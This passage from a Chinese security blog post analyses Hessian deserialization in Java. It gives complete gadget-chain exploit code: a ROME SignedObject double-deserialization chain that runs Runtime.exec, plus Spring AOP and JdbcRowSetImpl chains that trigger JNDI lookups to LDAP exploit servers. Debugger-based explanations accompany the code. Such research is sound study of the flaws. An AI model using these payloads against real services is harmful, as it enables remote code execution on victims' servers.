反序列化</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span></span><br><span class="line"><span class="comment">//        HessianInput hessianInput = new HessianInput(byteArrayInputStream);</span></span><br><span class="line"><span class="comment">//        Object student1 = hessianInput.readObject();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>刚才说了两个都不能执行有害的payload的内容，接下来再看看无害的payload在两个不同的jdk版本上的效果区别。</p>
+<p>8u20可以实现，8u281不能实现，区别在哪？</p>
+<p>是因为对于tfactory处理的区别</p>
+<p>8u281在defineTransletClass当中会对tfactory是否为bull做出判断</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\28.png" alt="28">
+<figcaption aria-hidden="true">28</figcaption>
+</figure>
+<p>但是在8u20当中，相应的函数里面并没有进行判断</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\29.png" alt="29">
+<figcaption aria-hidden="true">29</figcaption>
+</figure>
+<p>因为TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，所以说正常情况下反序列化之后_tfactory还是null，所以在8u281的条件下就无法实现反序列化攻击。</p>
+<p>可若是这样，transient是无差别的，那原生序列化不也一样无法写入_tfactory属性吗？</p>
+<p>莫急，我们注意到TemplatesImpl重写了原生readObject方法，在readObject中给_tfactory进行赋值，而Hessian中序列化和反序列化中都不会处理transient修饰的字段
+<img data-src="E:\JAVA安全\Hessian\image\30.png" alt="30"></p>
+<h5 id="rome利用链signedobject二次反序列化">rome利用链——signedobject二次反序列化</h5>
+<p>我们在之前的测试当中发现，想要直接依靠hessian的反序列化来动态加载templatesimpl的字节码是十分困难的。因为在hessian反序列化当中，他不会给tfactory赋值，只会导致后面使用defineTransletClass的时候判断无法通过。这时就需要引入rome利用链当中的二次反序列化了，从rome的利用链上来看我们有很多的选择方式但是大多数的方式都大同小异，只不过是换了一个入口而已，但是二次反序列化不一样，他依托于SignedObject当中getObject函数会调用反序列化，而这个反序列化不是hessian反序列化是原生反序列化。所以我们就可以设想出一条二次反序列化利用的路径</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoubleSerialHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass=classPool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplates();</span><br><span class="line">        <span class="comment">//装载Templates</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//防止序列化触发</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        setFieldValue(toStringBean, <span class="string">&quot;_obj&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;fanxing&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashmap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap1.put(equalsBean1,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        setFieldValue(equalsBean1, <span class="string">&quot;_beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line">        setFieldValue(equalsBean1, <span class="string">&quot;_obj&quot;</span>, toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(hashmap1);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="spring-aop利用链">Spring AOP利用链</h5>
+<h6 id="rome的spring利用链">rome的Spring利用链</h6>
+<p>其触发方式与大多数的反序列化的利用方式不同，它的入口函数是putval（详见rome的有Spring依赖下的反序列化攻击）,他的最与众不同的一点是什么呢？是他会涉及到hashmap当中的两个元素，后面的元素会先调用equals方法，里面会传入前一个元素的target</p>
+<h6 id="hessian的利用链">hessian的利用链</h6>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hessian#readObject()-&gt;</span><br><span class="line">    hashmap.put()-&gt;</span><br><span class="line">        hashMap.putVal()-&gt;</span><br><span class="line">            hotSwappableTargetSource#equals()-&gt;</span><br><span class="line">                AbstractPointcutAdvisor#equals()-&gt;</span><br><span class="line">                    AbstractBeanFactoryPointcutAdvisor#getAdvice()</span><br><span class="line">                        SimpleJndiBeanFactory#getBean()-&gt;</span><br><span class="line">                            lookup()</span><br></pre></td></tr></table></figure>
+<p>其payload如下所示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianSpring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:9999/siJdcpuR&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">simpleJndiBeanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        simpleJndiBeanFactory.setShareableResources(jndiUrl);<span class="comment">//这里一定要设置,为了过Singleton()</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; AbstractBeanFactoryPointcutAdvisor = Class.forName(<span class="string">&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;</span>);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">defaultBeanFactoryPointcutAdvisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">adviceBeanName</span> <span class="operator">=</span> AbstractBeanFactoryPointcutAdvisor.getDeclaredField(<span class="string">&quot;adviceBeanName&quot;</span>);</span><br><span class="line">        adviceBeanName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        adviceBeanName.set(defaultBeanFactoryPointcutAdvisor, jndiUrl);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">beanFactory</span> <span class="operator">=</span> AbstractBeanFactoryPointcutAdvisor.getDeclaredField(<span class="string">&quot;beanFactory&quot;</span>);</span><br><span class="line">        beanFactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        beanFactory.set(defaultBeanFactoryPointcutAdvisor, simpleJndiBeanFactory);</span><br><span class="line"></span><br><span class="line">        <span class="type">AsyncAnnotationAdvisor</span> <span class="variable">asyncAnnotationAdvisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AsyncAnnotationAdvisor</span>();</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource1, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(hotSwappableTargetSource,<span class="string">&quot;target&quot;</span>,defaultBeanFactoryPointcutAdvisor);</span><br><span class="line">        setFieldValue(hotSwappableTargetSource1,<span class="string">&quot;target&quot;</span>,asyncAnnotationAdvisor);</span><br><span class="line">        String result=Hessian_serialize(hashMap);</span><br><span class="line">        Hessian_unserialize(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>(); <span class="comment">//无需继承Serializable也可进行序列化和反序列化</span></span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessianOutput.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);</span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);</span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);</span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dfield.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据前面的调用栈，我们可以简单的分析该利用链的运行流程首先是通过spring的那条rome链进行触发进入，首当其冲的就是进入hotSwappableTargetSource当中进行equals方法的调用，其中的target是AsyncAnnotationAdvisor。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\35.png" alt="35">
+<figcaption aria-hidden="true">35</figcaption>
+</figure>
+<p>事实上这里会调用AbstractPointcutAdvisor的equals方法，因为AsyncAnnotationAdvisor其本身是没有这个方法的，它是通过继承关系继承到的来自其父类AbstractPointcutAdvisor的equals方法。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\36.png" alt="36">
+<figcaption aria-hidden="true">36</figcaption>
+</figure>
+<p>equals方法里面放的object是hashmap前面放的对象<code>defaultBeanFactoryPointcutAdvisor</code>，equals方法其继承自AbstractPointcutAdvisor，该类的equals方法如下图所示</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\31.png" alt="31">
+<figcaption aria-hidden="true">31</figcaption>
+</figure>
+<p>这个other是，前一个HotSwappableTargetSource的target是DefaultBeanFactoryPointcutAdvisor类型的对象，后面会调用该类对象的getAdvice函数。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\32.png" alt="32">
+<figcaption aria-hidden="true">32</figcaption>
+</figure>
+<p>在getAdvice当中需要通过名为<code>this.beanFactory.isSingleton(this.adviceBeanName)</code>的判断，才能够正常调用getBean()，这也是为什么在payload当中需要设置这一条字段。也就是说shareableResources里面要包含this.adviceBeanName</p>
+<p>这也是payload当中如下两行的来源</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simpleJndiBeanFactory.setShareableResources(jndiUrl);</span><br><span class="line">adviceBeanName.set(defaultBeanFactoryPointcutAdvisor, jndiUrl);</span><br></pre></td></tr></table></figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\34.png" alt="34">
+<figcaption aria-hidden="true">34</figcaption>
+</figure>
+<p>然后getAdvice()需要进入第二个if分支的语句，在该段代码当中会调用getBean()函数，在payload的设置当中我们可以看到beanFactory是SimpleJndiBeanFactory，直接去看该类当中对应的getBean方法。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\33.png" alt="33">
+<figcaption aria-hidden="true">33</figcaption>
+</figure>
+<p>在该类的第一个try当中，就会调用doGetSingleton，因为在之前的判断当中我们为了过之前的判断直接将this.isSingleton(name)的返回值为true，然后会进入doGetSingleton()，也正是在这里实现jndi注入的。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\37.png" alt="37">
+<figcaption aria-hidden="true">37</figcaption>
+</figure>
+<h6 id="hessian的rome-jdbc利用链">Hessian的Rome jdbc利用链</h6>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianRomeJdbc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>;</span><br><span class="line">        jdbcRowset.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        setFieldValue(toStringBean, <span class="string">&quot;_obj&quot;</span>, jdbcRowset);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line">        System.out.println(student1.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\43.png" alt="43">
+<figcaption aria-hidden="true">43</figcaption>
+</figure>
+<h5 id="反序列化总结">反序列化总结</h5>
+<p>之前我在前文讲了关于hessian反序列化的过程，当时我提出其利用点是this._fieldMap.get，这个玩意会调用hashmap的get方法，get方法里面会调用hash，但是事实上并非如此</p>
+<p>我们首先来到针对于反序列化数据头部的判定上面，这里有一个type的赋值操作</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\38.png" alt="38">
+<figcaption aria-hidden="true">38</figcaption>
+</figure>
+<p>单步进入下面的readmap当中我们可以发现，原来的type被赋值成了空，这导致他没有进入第一个if分支与之前我们调试情况有所不同，这也是大部分payload能够正常使用的重要原因。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\39.png" alt="39">
+<figcaption aria-hidden="true">39</figcaption>
+</figure>
+<p>为什么在payload当中它的type就为空，而我们之前序列化的普通类就不为空呢？从序列化后的数据中就能够找到答案：</p>
+<p>这个是我们正常的反序列化类</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\40.png" alt="40">
+<figcaption aria-hidden="true">40</figcaption>
+</figure>
+<p>这个是两个payload当中的序列化结果</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\41.png" alt="41">
+<figcaption aria-hidden="true">41</figcaption>
+</figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\42.png" alt="42">
+<figcaption aria-hidden="true">42</figcaption>
+</figure>
+<p>其实问题就出在两个类的嵌套上，当类当中有一个属性值也为一个类的时候就会发生这样的情况，在第一次读取发现后面的type为空因为后面也是一个类要重新开始计算。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" title="Hessian反序列化漏洞解析">https://f4nx1ng.github.io/2024/08/17/Hessian反序列化漏洞解析/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/Hessian/" rel="tag"># Hessian</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/" rel="prev" title="Hessian仅在JDK下的利用链研究">
+                  <i class="fa fa-angle-left"></i> Hessian仅在JDK下的利用链研究
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
